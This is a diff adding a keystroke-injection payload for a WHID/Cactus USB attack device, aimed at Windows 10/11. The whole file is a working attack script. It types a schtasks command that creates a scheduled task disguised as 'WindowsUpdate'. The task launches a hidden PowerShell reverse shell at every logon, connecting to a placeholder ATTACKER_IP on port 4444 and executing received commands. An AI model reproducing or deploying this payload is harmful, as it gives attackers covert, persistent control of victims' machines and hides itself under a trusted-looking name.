@@ -1,0 +1,10 @@
+REM === Cactus WHID Payload: Persistent Reverse Shell via Scheduled Task ===
+REM Target: Windows 10/11
+REM Category: Reverse Shell & Access
+REM Description: Creates a scheduled task that fires a PS reverse shell on every logon
+REM Replace: ATTACKER_IP and port 4444 with your listener
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd /c schtasks /create /tn "WindowsUpdate" /tr "powershell -NoP -W Hidden -Exec Bypass -C while(1){try{$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()}catch{Start-Sleep 30}}" /sc onlogon /rl highest /f
+ENTER
